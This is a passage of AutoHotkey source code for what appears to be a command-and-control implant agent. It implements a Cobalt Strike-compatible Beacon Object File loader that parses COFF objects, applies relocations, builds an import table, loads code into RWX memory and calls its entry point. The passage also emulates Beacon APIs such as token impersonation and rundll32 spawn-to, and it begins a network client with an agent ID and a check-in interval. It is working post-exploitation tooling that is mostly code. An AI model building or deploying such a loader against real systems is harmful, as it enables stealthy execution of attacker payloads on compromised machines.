            BOFLog(Format("BeaconOutput ERROR: {}", err.Message), "API")
        }
        return 0
    }

    ; ========================================================================
    ; DATA PARSING FUNCTIONS
    ; ========================================================================

    ; void BeaconDataParse(datap* parser, char* buffer1, int size)
    _BeaconDataParse(parserPtr, bufferPtr, size) {
        ; Store parser state
        this.ParserData[parserPtr] := {
            buffer1: bufferPtr,
            position: 0,
            length: size
        }

        ; Initialize the parser structure (first 3 fields: original, buffer1, length, size)
        if (parserPtr) {
            NumPut("Ptr", bufferPtr, parserPtr, 0)        ; original
            NumPut("Ptr", bufferPtr, parserPtr, 8)        ; buffer1 (current position)
            NumPut("Int", size, parserPtr, 16)            ; length
            NumPut("Int", size, parserPtr, 20)            ; size
        }
        return 0
    }

    ; char* BeaconDataPtr(datap* parser, int size)
    _BeaconDataPtr(parserPtr, size) {
        if (!this.ParserData.Has(parserPtr)) {
            return 0
        }

        state := this.ParserData[parserPtr]

        if (state.position + size > state.length) {
            return 0  ; Not enough data
        }

        ptr := state.buffer1 + state.position
        state.position += size
        this.ParserData[parserPtr] := state

        ; Update parser structure
        NumPut("Ptr", state.buffer1 + state.position, parserPtr, 8)
        NumPut("Int", state.length - state.position, parserPtr, 16)

        return ptr
    }

    ; int BeaconDataInt(datap* parser)
    _BeaconDataInt(parserPtr) {
        if (!this.ParserData.Has(parserPtr)) {
            return 0
        }

        state := this.ParserData[parserPtr]

        if (state.position + 4 > state.length) {
            return 0
        }

        ; Read 4-byte big-endian integer (Cobalt Strike uses network byte order)
        value := NumGet(state.buffer1, state.position, "UInt")
        ; Convert from big-endian to little-endian
        value := ((value & 0xFF) << 24) | ((value & 0xFF00) << 8) | ((value & 0xFF0000) >> 8) | ((value & 0xFF000000) >> 24)

        state.position += 4
        this.ParserData[parserPtr] := state

        ; Update parser structure
        NumPut("Ptr", state.buffer1 + state.position, parserPtr, 8)
        NumPut("Int", state.length - state.position, parserPtr, 16)

        return value
    }

    ; short BeaconDataShort(datap* parser)
    _BeaconDataShort(parserPtr) {
        if (!this.ParserData.Has(parserPtr)) {
            return 0
        }

        state := this.ParserData[parserPtr]

        if (state.position + 2 > state.length) {
            return 0
        }

        ; Read 2-byte big-endian short
        value := NumGet(state.buffer1, state.position, "UShort")
        ; Convert from big-endian
        value := ((value & 0xFF) << 8) | ((value & 0xFF00) >> 8)

        state.position += 2
        this.ParserData[parserPtr] := state

        NumPut("Ptr", state.buffer1 + state.position, parserPtr, 8)
        NumPut("Int", state.length - state.position, parserPtr, 16)

        return value
    }

    ; int BeaconDataLength(datap* parser)
    _BeaconDataLength(parserPtr) {
        if (!this.ParserData.Has(parserPtr)) {
            return 0
        }

        state := this.ParserData[parserPtr]
        return state.length - state.position
    }

    ; char* BeaconDataExtract(datap* parser, int* outLen)
    _BeaconDataExtract(parserPtr, outLenPtr) {
        if (!this.ParserData.Has(parserPtr)) {
            if (outLenPtr)
                NumPut("Int", 0, outLenPtr, 0)
            return 0
        }

        state := this.ParserData[parserPtr]

        ; Read length-prefixed data (4-byte length prefix)
        if (state.position + 4 > state.length) {
            if (outLenPtr)
                NumPut("Int", 0, outLenPtr, 0)
            return 0
        }

        ; Read length (big-endian)
        dataLen := NumGet(state.buffer1, state.position, "UInt")
        dataLen := ((dataLen & 0xFF) << 24) | ((dataLen & 0xFF00) << 8) | ((dataLen & 0xFF0000) >> 8) | ((dataLen & 0xFF000000) >> 24)

        state.position += 4

        if (state.position + dataLen > state.length) {
            if (outLenPtr)
                NumPut("Int", 0, outLenPtr, 0)
            return 0
        }

        ptr := state.buffer1 + state.position
        state.position += dataLen
        this.ParserData[parserPtr] := state

        if (outLenPtr)
            NumPut("Int", dataLen, outLenPtr, 0)

        NumPut("Ptr", state.buffer1 + state.position, parserPtr, 8)
        NumPut("Int", state.length - state.position, parserPtr, 16)

        return ptr
    }

    ; ========================================================================
    ; FORMAT FUNCTIONS
    ; ========================================================================

    ; void BeaconFormatAlloc(formatp* format, int maxsz)
    _BeaconFormatAlloc(formatPtr, maxsz) {
        buffer1 := DllCall("LocalAlloc", "UInt", 0x40, "UPtr", maxsz, "Ptr")  ; LMEM_ZEROINIT

        this.FormatBuffers[formatPtr] := {
            buffer1: buffer1,
            position: 0,
            maxlen: maxsz
        }

        if (formatPtr) {
            NumPut("Ptr", buffer1, formatPtr, 0)      ; original
            NumPut("Ptr", buffer1, formatPtr, 8)      ; buffer1
            NumPut("Int", maxsz, formatPtr, 16)      ; length
            NumPut("Int", maxsz, formatPtr, 20)      ; size
        }
        return 0
    }

    ; void BeaconFormatReset(formatp* format)
    _BeaconFormatReset(formatPtr) {
        if (this.FormatBuffers.Has(formatPtr)) {
            state := this.FormatBuffers[formatPtr]
            state.position := 0
            this.FormatBuffers[formatPtr] := state

            ; Zero the buffer1
            if (state.buffer1) {
                DllCall("RtlZeroMemory", "Ptr", state.buffer1, "UPtr", state.maxlen)
            }

            NumPut("Ptr", state.buffer1, formatPtr, 8)
            NumPut("Int", state.maxlen, formatPtr, 16)
        }
        return 0
    }

    ; void BeaconFormatFree(formatp* format)
    _BeaconFormatFree(formatPtr) {
        if (this.FormatBuffers.Has(formatPtr)) {
            state := this.FormatBuffers[formatPtr]
            if (state.buffer1) {
                DllCall("LocalFree", "Ptr", state.buffer1)
            }
            this.FormatBuffers.Delete(formatPtr)
        }
        return 0
    }

    ; void BeaconFormatAppend(formatp* format, char* data, int len)
    _BeaconFormatAppend(formatPtr, dataPtr, len) {
        if (!this.FormatBuffers.Has(formatPtr) || !dataPtr || len <= 0) {
            return 0
        }

        state := this.FormatBuffers[formatPtr]

        if (state.position + len > state.maxlen) {
            len := state.maxlen - state.position
        }

        if (len > 0) {
            DllCall("RtlCopyMemory",
                "Ptr", state.buffer1 + state.position,
                "Ptr", dataPtr,
                "UPtr", len)
            state.position += len
            this.FormatBuffers[formatPtr] := state
        }
        return 0
    }

    ; void BeaconFormatPrintf(formatp* format, char* fmt, ...)
    _BeaconFormatPrintf(formatPtr, fmtPtr, argPtr) {
        ; Simplified implementation - just append the format string
        if (!this.FormatBuffers.Has(formatPtr) || !fmtPtr) {
            return 0
        }

        text := StrGet(fmtPtr, "UTF-8")
        state := this.FormatBuffers[formatPtr]

        ; Write to buffer1
        textBytes := Buffer(StrPut(text, "UTF-8") - 1)
        StrPut(text, textBytes, "UTF-8")

        remaining := state.maxlen - state.position
        copyLen := Min(textBytes.Size, remaining)

        if (copyLen > 0) {
            DllCall("RtlCopyMemory",
                "Ptr", state.buffer1 + state.position,
                "Ptr", textBytes,
                "UPtr", copyLen)
            state.position += copyLen
            this.FormatBuffers[formatPtr] := state
        }
        return 0
    }

    ; char* BeaconFormatToString(formatp* format, int* size)
    _BeaconFormatToString(formatPtr, sizePtr) {
        if (!this.FormatBuffers.Has(formatPtr)) {
            if (sizePtr)
                NumPut("Int", 0, sizePtr, 0)
            return 0
        }

        state := this.FormatBuffers[formatPtr]

        if (sizePtr)
            NumPut("Int", state.position, sizePtr, 0)

        return state.buffer1
    }

    ; void BeaconFormatInt(formatp* format, int val)
    _BeaconFormatInt(formatPtr, val) {
        if (!this.FormatBuffers.Has(formatPtr)) {
            return 0
        }

        state := this.FormatBuffers[formatPtr]

        if (state.position + 4 <= state.maxlen) {
            NumPut("Int", val, state.buffer1, state.position)
            state.position += 4
            this.FormatBuffers[formatPtr] := state
        }
        return 0
    }

    ; ========================================================================
    ; TOKEN FUNCTIONS
    ; ========================================================================

    ; BOOL BeaconUseToken(HANDLE token)
    _BeaconUseToken(token) {
        if (!token) {
            return 0
        }

        result := DllCall("advapi32\ImpersonateLoggedOnUser", "Ptr", token, "Int")
        if (result) {
            this.CurrentToken := token
        }
        return result
    }

    ; void BeaconRevertToken()
    _BeaconRevertToken() {
        DllCall("advapi32\RevertToSelf")
        this.CurrentToken := 0
        return 0
    }

    ; BOOL BeaconIsAdmin()
    _BeaconIsAdmin() {
        ; Check if running as administrator
        ; Using token check method
        try {
            ; Open current process token
            hToken := 0
            DllCall("advapi32\OpenProcessToken",
                "Ptr", DllCall("GetCurrentProcess", "Ptr"),
                "UInt", 0x0008,  ; TOKEN_QUERY
                "Ptr*", &hToken)

            if (!hToken) {
                return 0
            }

            ; Check for elevation
            elevation := 0
            returnLength := 0
            DllCall("advapi32\GetTokenInformation",
                "Ptr", hToken,
                "Int", 20,  ; TokenElevation
                "Int*", &elevation,
                "UInt", 4,
                "UInt*", &returnLength)

            DllCall("CloseHandle", "Ptr", hToken)
            return elevation != 0
        } catch {
            return 0
        }
    }

    ; ========================================================================
    ; UTILITY FUNCTIONS
    ; ========================================================================

    ; BOOL toWideChar(char* src, wchar_t* dst, int max)
    _toWideChar(srcPtr, dstPtr, max) {
        if (!srcPtr || !dstPtr || max <= 0) {
            return 0
        }

        result := DllCall("MultiByteToWideChar",
            "UInt", 65001,  ; CP_UTF8
            "UInt", 0,
            "Ptr", srcPtr,
            "Int", -1,
            "Ptr", dstPtr,
            "Int", max,
            "Int")

        return result > 0
    }

    ; int getOSMajorVersion()
    _getOSMajorVersion() {
        ; Parse from A_OSVersion
        parts := StrSplit(A_OSVersion, ".")
        if (parts.Length >= 1) {
            return Integer(parts[1])
        }
        return 10  ; Default to 10
    }

    ; int getOSMinorVersion()
    _getOSMinorVersion() {
        parts := StrSplit(A_OSVersion, ".")
        if (parts.Length >= 2) {
            return Integer(parts[2])
        }
        return 0
    }

    ; ========================================================================
    ; PROCESS INJECTION STUBS (Limited implementation)
    ; ========================================================================

    ; void BeaconGetSpawnTo(BOOL x86, char* buffer1, int length)
    _BeaconGetSpawnTo(x86, bufferPtr, length) {
        ; Return path to default spawn process
        spawnTo := x86 ? "C:\Windows\SysWOW64\rundll32.exe" : "C:\Windows\System32\rundll32.exe"

        if (bufferPtr && length > 0) {
            copyLen := Min(StrLen(spawnTo), length - 1)
            DllCall("RtlCopyMemory", "Ptr", bufferPtr, "AStr", spawnTo, "UPtr", copyLen)
            NumPut("Char", 0, bufferPtr, copyLen)  ; Null terminate
        }
        return 0
    }

    ; void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int payloadLen, int offset, char* arg, int argLen)
    _BeaconInjectProcess(hProcess, pid, payload, payloadLen, offset, arg, argLen) {
        ; Stub - process injection not implemented
        this.OutputBuffer .= "[!] BeaconInjectProcess not implemented`n"
        return 0
    }

    ; void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int payloadLen, int offset, char* arg, int argLen)
    _BeaconInjectTemporaryProcess(pInfo, payload, payloadLen, offset, arg, argLen) {
        ; Stub - process injection not implemented
        this.OutputBuffer .= "[!] BeaconInjectTemporaryProcess not implemented`n"
        return 0
    }

    ; BOOL BeaconCleanupProcess(PROCESS_INFORMATION* pInfo)
    _BeaconCleanupProcess(pInfo) {
        ; Cleanup process handles
        if (pInfo) {
            hProcess := NumGet(pInfo, 0, "Ptr")
            hThread := NumGet(pInfo, 8, "Ptr")

            if (hThread)
                DllCall("CloseHandle", "Ptr", hThread)
            if (hProcess)
                DllCall("CloseHandle", "Ptr", hProcess)
        }
        return 1
    }

    ; Cleanup
    __Delete() {
        ; Free all callbacks
        for name, cb in this.Callbacks {
            if (cb)
                CallbackFree(cb)
        }

        ; Free format buffers
        for ptr, state in this.FormatBuffers {
            if (state.buffer1)
                DllCall("LocalFree", "Ptr", state.buffer1)
        }
    }
}

class RelocationProcessor {
    ; Process all relocations for all sections
    ProcessRelocations(sections, symbols, apiResolver, is64Bit) {
        BOFLog("=== PROCESSING RELOCATIONS ===", "RELOC")

        totalRelocs := 0
        for section in sections {
            totalRelocs += section.Relocations.Length
        }
        BOFLog(Format("Total relocations to process: {}", totalRelocs), "RELOC")

        for section in sections {
            if (!this.ProcessSectionRelocations(section, sections, symbols, apiResolver, is64Bit)) {
                return false
            }
        }

        BOFLog("All relocations processed successfully", "RELOC")
        return true
    }

    ; Process relocations for a single section
    ProcessSectionRelocations(section, allSections, symbols, apiResolver, is64Bit) {
        if (section.Relocations.Length = 0) {
            return true
        }

        if (!section.LoadedAddress) {
            ; Section not loaded into memory
            return true
        }

        BOFLog(Format("Processing {} relocations for section '{}'", section.Relocations.Length, section.Name), "RELOC")

        for reloc in section.Relocations {
            if (!this.ApplyRelocation(section, reloc, allSections, symbols, apiResolver, is64Bit)) {
                return false
            }
        }

        return true
    }

    ; Apply a single relocation
    ApplyRelocation(section, reloc, allSections, symbols, apiResolver, is64Bit) {
        ; Get the symbol this relocation references (symbols is a Map keyed by 0-based index)
        if (!symbols.Has(reloc.SymbolTableIndex)) {
            throw Error("Relocation symbol index not found: " . reloc.SymbolTableIndex)
        }

        sym := symbols[reloc.SymbolTableIndex]

        ; Calculate the address where we need to patch
        patchAddress := section.LoadedAddress + reloc.VirtualAddress

        ; Get the target address (symbol value)
        targetAddress := this.ResolveSymbolAddress(sym, allSections, apiResolver)

        if (targetAddress = 0 && sym.IsExternal) {
            throw Error("Failed to resolve external symbol: " . sym.ResolvedName)
        }

        ; Log relocations for debugging
        if (InStr(sym.ResolvedName, "__imp_")) {
            displacement := targetAddress - (patchAddress + 4)
            ; Read 3 bytes before patchAddress to catch REX prefix + opcode + ModR/M
            byte1 := NumGet(patchAddress - 3, 0, "UChar")  ; Possible REX prefix
            byte2 := NumGet(patchAddress - 2, 0, "UChar")  ; Opcode
            byte3 := NumGet(patchAddress - 1, 0, "UChar")  ; ModR/M

            ; Check if this is a MOV with potential 32-bit truncation issue
            warning := ""
            if (byte2 = 0x8B && byte1 != 0x48 && byte1 != 0x4C) {
                ; 8B without REX.W prefix = 32-bit load, will truncate 64-bit pointers!
                warning := " *** WARNING: 32-bit MOV may truncate pointer! ***"
            }

            BOFLog(Format("  RELOC __imp_: {} @ 0x{:X} (bytes {:02X} {:02X} {:02X}) -> IAT 0x{:X}, disp=0x{:08X}{}",
                sym.ResolvedName, patchAddress, byte1, byte2, byte3, targetAddress, displacement & 0xFFFFFFFF, warning), "RELOC")
        } else if (sym.IsExternal) {
            ; Non-__imp_ external symbol - this is unusual
            BOFLog(Format("  RELOC EXT: {} @ 0x{:X} -> target 0x{:X} (type={})",
                sym.ResolvedName, patchAddress, targetAddress, reloc.Type), "RELOC")
        } else {
            ; Internal symbol - log all of them since there might be issues
            ; Also show the existing addend at the patch site
            existingAddend := NumGet(patchAddress, 0, "Int")
            BOFLog(Format("  RELOC INT: {} @ 0x{:X} -> target 0x{:X} (section={}, type={}, addend=0x{:X})",
                sym.ResolvedName, patchAddress, targetAddress, sym.SectionNumber, reloc.Type, existingAddend & 0xFFFFFFFF), "RELOC")
        }

        ; Apply the relocation based on type
        if (is64Bit) {
            return this.ApplyAMD64Relocation(patchAddress, targetAddress, reloc.Type)
        } else {
            return this.ApplyI386Relocation(patchAddress, targetAddress, reloc.Type)
        }
    }

    ; Resolve a symbol to its final address
    ResolveSymbolAddress(sym, allSections, apiResolver) {
        ; Check if symbol already has a resolved address (e.g., from IAT)
        ; This is used for __imp_ symbols which need to point to IAT entries
        if (sym.ResolvedAddress != 0) {
            return sym.ResolvedAddress
        }

        if (sym.IsExternal) {
            ; External symbol without IAT entry - resolve directly
            ; (This path shouldn't be hit for __imp_ symbols if IAT was built)
            return apiResolver.ResolveImport(sym.ResolvedName)
        }

        if (sym.SectionNumber > 0 && sym.SectionNumber <= allSections.Length) {
            ; Symbol is in a section
            section := allSections[sym.SectionNumber]
            if (section.LoadedAddress) {
                return section.LoadedAddress + sym.Value
            }
        }

        if (sym.SectionNumber = -1) {
            ; Absolute symbol
            return sym.Value
        }

        ; Cannot resolve
        return 0
    }

    ; Apply AMD64 (x64) relocation
    ApplyAMD64Relocation(patchAddress, targetAddress, relocType) {
        switch relocType {
            case Relocation.IMAGE_REL_AMD64_ADDR64:
                ; 64-bit absolute address
                NumPut("Int64", targetAddress, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_AMD64_ADDR32:
                ; 32-bit absolute address
                NumPut("UInt", targetAddress & 0xFFFFFFFF, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_AMD64_ADDR32NB:
                ; 32-bit RVA (not used in BOFs typically)
                NumPut("UInt", targetAddress & 0xFFFFFFFF, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_AMD64_REL32:
                ; 32-bit relative displacement
                ; Formula: target - (patchAddress + 4) + originalAddend
                ; Read the existing addend at the patch site (important for internal section refs)
                existingAddend := NumGet(patchAddress, 0, "Int")
                displacement := this.CalculateRelative32(targetAddress, patchAddress) + existingAddend
                NumPut("Int", displacement, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_AMD64_REL32_1:
                ; 32-bit relative, +1 addend from instruction encoding
                existingAddend := NumGet(patchAddress, 0, "Int")
                displacement := this.CalculateRelative32(targetAddress, patchAddress) + existingAddend - 1
                NumPut("Int", displacement, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_AMD64_REL32_2:
                ; 32-bit relative, +2 addend from instruction encoding
                existingAddend := NumGet(patchAddress, 0, "Int")
                displacement := this.CalculateRelative32(targetAddress, patchAddress) + existingAddend - 2
                NumPut("Int", displacement, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_AMD64_REL32_4:
                ; 32-bit relative, +4 addend from instruction encoding
                existingAddend := NumGet(patchAddress, 0, "Int")
                displacement := this.CalculateRelative32(targetAddress, patchAddress) + existingAddend - 4
                NumPut("Int", displacement, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_AMD64_REL32_5:
                ; 32-bit relative, +5 addend from instruction encoding
                existingAddend := NumGet(patchAddress, 0, "Int")
                displacement := this.CalculateRelative32(targetAddress, patchAddress) + existingAddend - 5
                NumPut("Int", displacement, patchAddress, 0)
                return true

            default:
                throw Error("Unsupported AMD64 relocation type: " . Format("0x{:04X}", relocType))
        }
    }

    ; Apply I386 (x86) relocation
    ApplyI386Relocation(patchAddress, targetAddress, relocType) {
        switch relocType {
            case Relocation.IMAGE_REL_I386_DIR32:
                ; 32-bit absolute address
                NumPut("UInt", targetAddress & 0xFFFFFFFF, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_I386_DIR32NB:
                ; 32-bit RVA
                NumPut("UInt", targetAddress & 0xFFFFFFFF, patchAddress, 0)
                return true

            case Relocation.IMAGE_REL_I386_REL32:
                ; 32-bit relative displacement with existing addend
                existingAddend := NumGet(patchAddress, 0, "Int")
                displacement := this.CalculateRelative32(targetAddress, patchAddress) + existingAddend
                NumPut("Int", displacement, patchAddress, 0)
                return true

            default:
                throw Error("Unsupported I386 relocation type: " . Format("0x{:04X}", relocType))
        }
    }

    ; Calculate 32-bit relative displacement
    ; For x86/x64: target - (patchAddress + 4)
    CalculateRelative32(targetAddress, patchAddress) {
        ; The displacement is calculated from the END of the instruction
        ; which is patchAddress + 4 (size of the displacement field)
        result := targetAddress - (patchAddress + 4)

        ; Ensure it fits in 32 bits signed
        if (result > 0x7FFFFFFF || result < -0x80000000) {
            throw Error(Format("Relative displacement out of range: 0x{:016X}", result))
        }

        return result
    }
}

class BOFLoader {
    Parser := ""
    Memory := ""
    API := ""
    Resolver := ""
    Relocator := ""
    IATBuffer := ""        ; Import Address Table buffer
    IATBaseAddress := 0    ; Base address of IAT

    __New() {
        this.Memory := MemoryManager()
        this.API := BeaconAPI()
        this.Resolver := APIResolver(this.API)
        this.Relocator := RelocationProcessor()
    }

    ; Main entry point - execute a BOF
    Execute(bofBytes, arguments := []) {
        BOFLog("========================================", "LOADER")
        BOFLog("       BOF EXECUTION STARTING", "LOADER")
        BOFLog("========================================", "LOADER")

        ; Clear any previous output
        this.API.ClearOutput()

        try {
            ; 1. Parse COFF structure
            this.Parser := COFFParser()
            this.Parser.Parse(bofBytes)

            ; 2. Allocate memory for sections and load them
            BOFLog("=== LOADING SECTIONS ===", "LOADER")
            this.LoadSections()

            ; 3. Build Import Address Table for external symbols
            BOFLog("=== BUILDING IAT ===", "LOADER")
            this.BuildImportAddressTable()

            ; 4. Process relocations (resolves symbols and patches addresses)
            BOFLog("=== RESOLVING SYMBOLS ===", "LOADER")
            this.Relocator.ProcessRelocations(
                this.Parser.Sections,
                this.Parser.Symbols,
                this.Resolver,
                this.Parser.Is64Bit()
            )

            ; 4. Find entry point (go or _go symbol)
            BOFLog("=== FINDING ENTRY POINT ===", "LOADER")
            entrySymbol := this.Parser.FindEntryPoint()
            if (!entrySymbol) {
                throw Error("No entry point found (expected 'go' or '_go' symbol)")
            }

            entryAddress := this.GetSymbolAddress(entrySymbol)
            if (!entryAddress) {
                throw Error("Failed to resolve entry point address")
            }

            BOFLog(Format("Entry point '{}' at 0x{:016X}", entrySymbol.ResolvedName, entryAddress), "LOADER")

            ; 5. Pack arguments for BOF
            argBuffer := this.PackArguments(arguments)
            BOFLog(Format("Packed {} arguments ({} bytes)", arguments.Length, argBuffer.Size), "LOADER")

            ; 6. Call the entry point
            BOFLog("=== EXECUTING BOF ===", "LOADER")
            BOFLog("Calling entry point...", "LOADER")
            this.CallEntryPoint(entryAddress, argBuffer)
            BOFLog("Entry point returned successfully", "LOADER")

            ; 7. Return collected output
            BOFLog("=== BOF EXECUTION COMPLETE ===", "LOADER")
            return this.API.GetOutput()

        } catch as err {
            BOFLog(Format("BOF EXECUTION FAILED: {}", err.Message), "LOADER")
            return "BOF Error: " . err.Message . "`n" . this.API.GetOutput()
        }
    }

    ; Load sections into memory
    LoadSections() {
        loadedCount := 0
        for section in this.Parser.Sections {
            if (section.SizeOfRawData = 0) {
                BOFLog(Format("  Skipping empty section '{}'", section.Name), "LOADER")
                continue
            }

            ; Determine memory type based on section characteristics
            memType := ""
            if (section.IsExecutable() || section.IsCode()) {
                ; Code section - needs RWX
                section.LoadedAddress := this.Memory.AllocateRWX(section.SizeOfRawData)
                memType := "RWX"
            } else {
                ; Data section - just RW
                section.LoadedAddress := this.Memory.AllocateRW(section.SizeOfRawData)
                memType := "RW"
            }

            if (!section.LoadedAddress) {
                throw Error("Failed to allocate memory for section: " . section.Name)
            }

            ; Copy section data
            if (section.RawData && section.SizeOfRawData > 0) {
                this.Memory.WriteBytes(
                    section.LoadedAddress,
                    section.RawData,
                    section.SizeOfRawData
                )
            }

            loadedCount++
            BOFLog(Format("  Loaded section '{}' ({}) at 0x{:016X} ({} bytes)",
                section.Name, memType, section.LoadedAddress, section.SizeOfRawData), "LOADER")
        }

        BOFLog(Format("Loaded {} sections into memory", loadedCount), "LOADER")
    }

    ; Build Import Address Table for external symbols
    ; This creates a local table of 64-bit function pointers that nearby REL32
    ; relocations can reach, solving the ±2GB relative addressing limitation
    BuildImportAddressTable() {
        ; Count external symbols that need IAT entries
        externalSymbols := []
        for index, sym in this.Parser.Symbols {
            if (sym.IsExternal && InStr(sym.ResolvedName, "__imp_")) {
                externalSymbols.Push(sym)
            }
        }

        if (externalSymbols.Length = 0) {
            BOFLog("No external imports requiring IAT", "LOADER")
            return
        }

        ; Allocate IAT: 8 bytes per entry (64-bit pointers)
        iatSize := externalSymbols.Length * 8
        this.IATBaseAddress := this.Memory.AllocateRW(iatSize)

        if (!this.IATBaseAddress) {
            throw Error("Failed to allocate Import Address Table")
        }

        BOFLog(Format("Allocated IAT at 0x{:016X} ({} entries, {} bytes)",
            this.IATBaseAddress, externalSymbols.Length, iatSize), "LOADER")

        ; Populate IAT and update symbol ResolvedAddress fields
        iatOffset := 0
        for sym in externalSymbols {
            ; Resolve the actual API address
            BOFLog(Format("  Resolving: {}", sym.ResolvedName), "LOADER")
            apiAddress := this.Resolver.ResolveImport(sym.ResolvedName)

            if (apiAddress = 0) {
                BOFLog(Format("  *** FAILED TO RESOLVE: {} ***", sym.ResolvedName), "LOADER")
            }

            ; Calculate the IAT entry address for this symbol
            iatEntryAddress := this.IATBaseAddress + iatOffset

            ; Write the 64-bit API address to the IAT
            NumPut("Int64", apiAddress, iatEntryAddress, 0)

            ; Store the IAT entry address in the symbol (not the API address!)
            ; This is what REL32 relocations will reference
            sym.ResolvedAddress := iatEntryAddress

            BOFLog(Format("  IAT[{}]: {} -> 0x{:016X} @ IAT 0x{:016X}",
                iatOffset // 8, sym.ResolvedName, apiAddress, iatEntryAddress), "LOADER")

            iatOffset += 8
        }

        BOFLog(Format("IAT populated with {} entries", externalSymbols.Length), "LOADER")
    }

    ; Get the runtime address of a symbol
    GetSymbolAddress(sym) {
        if (sym.SectionNumber > 0 && sym.SectionNumber <= this.Parser.Sections.Length) {
            section := this.Parser.Sections[sym.SectionNumber]
            if (section.LoadedAddress) {
                return section.LoadedAddress + sym.Value
            }
        }
        return 0
    }

    ; Pack arguments into BOF argument format
    ; Cobalt Strike BOF argument format: 4-byte length prefix followed by data
    PackArguments(arguments) {
        if (arguments.Length = 0) {
            ; Return empty buffer1
            return Buffer(0)
        }

        ; Calculate total size needed
        totalSize := 0
        for arg in arguments {
            if (Type(arg) = "Buffer") {
                totalSize += 4 + arg.Size  ; 4 bytes length + data
            } else if (Type(arg) = "Integer") {
                totalSize += 4  ; Just the integer
            } else {
                ; String - include null terminator
                strLen := StrPut(arg, "UTF-8")
                totalSize += 4 + strLen
            }
        }

        ; Create buffer1
        argBuffer := Buffer(totalSize, 0)
        offset := 0

        for arg in arguments {
            if (Type(arg) = "Buffer") {
                ; Length prefix (big-endian)
                this.WriteInt32BE(argBuffer, offset, arg.Size)
                offset += 4
                ; Data
                DllCall("RtlCopyMemory",
                    "Ptr", argBuffer.Ptr + offset,
                    "Ptr", arg,
                    "UPtr", arg.Size)
                offset += arg.Size
            } else if (Type(arg) = "Integer") {
                ; Integer (big-endian)
                this.WriteInt32BE(argBuffer, offset, arg)
                offset += 4
            } else {
                ; String with length prefix
                strBytes := Buffer(StrPut(arg, "UTF-8"))
                StrPut(arg, strBytes, "UTF-8")
                strLen := strBytes.Size

                ; Length prefix (big-endian)
                this.WriteInt32BE(argBuffer, offset, strLen)
                offset += 4

                ; String data
                DllCall("RtlCopyMemory",
                    "Ptr", argBuffer.Ptr + offset,
                    "Ptr", strBytes,
                    "UPtr", strLen)
                offset += strLen
            }
        }

        return argBuffer
    }

    ; Write 32-bit integer in big-endian format
    WriteInt32BE(buffer1, offset, value) {
        NumPut("UChar", (value >> 24) & 0xFF, buffer1, offset)
        NumPut("UChar", (value >> 16) & 0xFF, buffer1, offset + 1)
        NumPut("UChar", (value >> 8) & 0xFF, buffer1, offset + 2)
        NumPut("UChar", value & 0xFF, buffer1, offset + 3)
    }

    ; Call the BOF entry point
    ; Signature: void go(char* args, int argLen)
    CallEntryPoint(entryAddr, argBuffer) {
        argPtr := argBuffer.Size > 0 ? argBuffer.Ptr : 0
        argLen := argBuffer.Size

        BOFLog(Format("About to call entry point at 0x{:016X} with args(ptr=0x{:X}, len={})",
            entryAddr, argPtr, argLen), "LOADER")

        ; Debug: Read first 16 bytes at entry point to verify code is there
        bytes := ""
        Loop 16 {
            b := NumGet(entryAddr, A_Index - 1, "UChar")
            bytes .= Format("{:02X} ", b)
        }
        BOFLog(Format("Entry point bytes: {}", bytes), "LOADER")

        ; Debug: The first call (E8 xx xx xx xx at offset 4) - where does it go?
        if (NumGet(entryAddr, 4, "UChar") = 0xE8) {
            ; Read the relative displacement (little-endian signed 32-bit)
            callDisp := NumGet(entryAddr, 5, "Int")
            callTarget := entryAddr + 9 + callDisp  ; 9 = offset after the call instruction
            BOFLog(Format("First internal call: disp=0x{:08X} -> target 0x{:016X}", callDisp & 0xFFFFFFFF, callTarget), "LOADER")

            ; Show bytes at the call target
            targetBytes := ""
            Loop 16 {
                b := NumGet(callTarget, A_Index - 1, "UChar")
                targetBytes .= Format("{:02X} ", b)
            }
            BOFLog(Format("Call target bytes: {}", targetBytes), "LOADER")
        }

        ; Debug: Find and verify BeaconOutput IAT entry
        if (this.IATBaseAddress) {
            ; Find BeaconOutput symbol dynamically (it's at different IAT positions for different BOFs)
            beaconOutputIAT := 0
            for index, sym in this.Parser.Symbols {
                if (sym.ResolvedName = "__imp_BeaconOutput" && sym.ResolvedAddress != 0) {
                    ; sym.ResolvedAddress points to the IAT entry, read the pointer from it
                    beaconOutputIAT := NumGet(sym.ResolvedAddress, 0, "Int64")
                    iatOffset := sym.ResolvedAddress - this.IATBaseAddress
                    BOFLog(Format("BeaconOutput IAT entry at offset {} -> pointer 0x{:016X}", iatOffset, beaconOutputIAT), "LOADER")
                    break
                }
            }

        }

        ; Call the entry point
        ; void go(char* args, int len)
        ; Note: x64 Windows uses only one calling convention (Microsoft x64)
        try {
            BOFLog("Invoking DllCall now...", "LOADER")
            result := DllCall(entryAddr,
                "Ptr", argPtr,
                "Int", argLen)
            BOFLog(Format("DllCall returned successfully (result={})", result), "LOADER")
        } catch as err {
            BOFLog(Format("DllCall threw exception: {}", err.Message), "LOADER")
            throw Error("Entry point call failed: " . err.Message)
        }
    }

    ; Cleanup all resources
    Cleanup() {
        BOFLog("Cleaning up BOF resources...", "LOADER")
        this.Memory.FreeAll()
        BOFLog("Cleanup complete", "LOADER")
    }

    ; Get debug info about loaded BOF
    DumpInfo() {
        if (!this.Parser) {
            return "No BOF loaded"
        }

        info := this.Parser.DumpInfo()

        info .= "`n=== Loaded Sections ===`n"
        for section in this.Parser.Sections {
            if (section.LoadedAddress) {
                info .= Format("{}: 0x{:016X}`n", section.Name, section.LoadedAddress)
            }
        }

        info .= "`n" . this.Resolver.DumpResolved()

        return info
    }
}

; ============================================================================
; NETWORK CLIENT CLASS
; ============================================================================

class NetworkClient {
    AF_INET := 2
    SOCK_STREAM := 1
    IPPROTO_TCP := 6
    SOCKET_ERROR := -1
    WSAEWOULDBLOCK := 10035
    WSAECONNREFUSED := 10061
    WSAETIMEDOUT := 10060

    socket := 0
    wsaInitialized := false
    serverIP := "127.0.0.1"
    serverPort := 5074
    agentID := ""
    computerName := ""

    checkInInterval := 15000  ; 15 seconds default
